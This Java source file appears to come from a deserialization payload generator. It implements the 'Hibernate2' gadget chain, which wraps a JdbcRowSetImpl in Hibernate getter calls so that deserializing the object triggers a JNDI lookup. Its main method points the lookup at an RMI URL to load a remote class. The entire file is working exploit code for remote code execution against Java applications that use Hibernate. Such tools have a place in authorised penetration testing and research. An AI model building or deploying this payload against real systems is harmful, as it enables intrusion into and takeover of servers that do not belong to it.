package com.ppp.chain.hibernate;

import com.ppp.JavaClassHelper;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import com.sun.rowset.JdbcRowSetImpl;

/**
 * Another application filter bypass
 * <p>
 * Needs a getter invocation that is provided by hibernate here
 * <p>
 * javax.naming.InitialContext.InitialContext.lookup()
 * com.sun.rowset.JdbcRowSetImpl.connect()
 * com.sun.rowset.JdbcRowSetImpl.getDatabaseMetaData()
 * org.hibernate.property.access.spi.GetterMethodImpl.get()
 * org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue()
 * org.hibernate.type.ComponentType.getPropertyValue(C)
 * org.hibernate.type.ComponentType.getHashCode()
 * org.hibernate.engine.spi.TypedValue$1.initialize()
 * org.hibernate.engine.spi.TypedValue$1.initialize()
 * org.hibernate.internal.util.ValueHolder.getValue()
 * org.hibernate.engine.spi.TypedValue.hashCode()
 * <p>
 * <p>
 * Requires:
 * - Hibernate (>= 5 gives arbitrary method invocation, <5 getXYZ only)
 * <p>
 * Arg:
 * - JNDI name (i.e. rmi:<host>)
 * <p>
 * Yields:
 * - JNDI lookup invocation (e.g. connect to remote RMI)
 *
 * @author mbechler
 */
@Dependencies({"org.hibernate:hibernate-core"})
@Authors({Authors.MBECHLER})
@Sink({Sink.JNDI})
public class Hibernate2 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
//        PayloadRunner.run(Hibernate2.class, args);

        SinksHelper sinksHelper = new SinksHelper();
        sinksHelper.setSink(Hibernate2.class.getAnnotation(Sink.class).value()[0]);
        sinksHelper.setEnchant(EnchantType.DEFAULT);
        sinksHelper.setCommand("rmi://127.0.0.1:1099/ldlzx6");
        JavaClassHelper javaClassHelper = new JavaClassHelper();
        javaClassHelper.setExtendsAbstractTranslet(true);
        sinksHelper.setJavaClassHelper(javaClassHelper);

        PayloadRunner.run(Hibernate2.class, args, sinksHelper);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object command) throws Exception {
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setDataSourceName((String) command);
        return Hibernate1.makeCaller(rs, Hibernate1.makeGetter(rs.getClass(), "getDatabaseMetaData"));
    }
}
